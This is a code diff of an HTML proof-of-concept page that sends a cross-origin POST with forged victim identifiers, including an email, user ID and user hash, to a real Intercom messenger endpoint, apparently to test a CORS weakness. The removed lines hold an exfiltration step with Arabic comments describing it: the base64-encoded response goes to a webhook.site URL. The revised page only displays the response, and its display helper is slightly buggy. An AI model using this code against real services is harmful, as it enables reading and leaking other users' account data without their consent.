@@ -1,34 +1,39 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
-<head>
-  <title>CORS PoC</title>
-</head>
+<head><meta charset="utf-8"><title>CORS PoC Intercom</title></head>
 <body>
-  <h1>CORS PoC - Intercom</h1>
+  <h2>CORS PoC Test</h2>
+  <pre id="out">running...</pre>
   <script>
+    const out = id => document.getElementById('out').textContent = id;
     fetch("https://api-iam.intercom.io/messenger/web/ping", {
       method: "POST",
       headers: {
+        "Accept": "application/json",
         "Content-Type": "application/x-www-form-urlencoded"
       },
-      body: "app_id=rfwdy059&v=3&platform=web&installation_type=js-snippet&user_data=" + 
-            encodeURIComponent(JSON.stringify({
-              email: "victim@example.com",
-              user_id: "18706074",
-              user_hash: "aaa329ca8412777f4d24580655930117afc084b7051d0707ec97fe7477ab7880",
-              anonymous_id: "b3b9f985-a11c-46d5-bdda-35aa69d205aa",
-              name: "Injected Attacker"
-            }))
+      body: new URLSearchParams({
+        app_id: 'rfwdy059',
+        v: '3',
+        platform: 'web',
+        installation_type: 'js-snippet',
+        user_data: JSON.stringify({
+          email: "victim@example.com",
+          user_id: "18706074",
+          user_hash: "aaa329ca8412777f4d24580655930117afc084b7051d0707ec97fe7477ab7880",
+          anonymous_id: "b3b9f985-a11c-46d5-bdda-35aa69d205aa",
+          name: "PoC"
+        })
+      })
     })
-    .then(res => res.text())
-    .then(data => {
-      // عرض الريسبونس على صفحة المهاجم
-      document.body.innerHTML += "<pre>" + data + "</pre>";
-
-      // أو تسريب الداتا لسيرفر المهاجم
-      fetch("https://webhook.site/e018a665-94af-49eb-b82f-68da45203f50?data=" + btoa(data));
+    .then(async res => {
+      out('status: ' + res.status + '\\nheaders:\\n' + Array.from(res.headers.entries()).map(h=>h.join(': ')).join('\\n'));
+      try {
+        const text = await res.text();
+        out(out() + '\\n\\nbody:\\n' + text);
+      } catch(e){ out('could not read body: '+e) }
     })
-    .catch(err => console.error("Error:", err));
+    .catch(err => out('fetch error: '+err));
   </script>
 </body>
 </html>
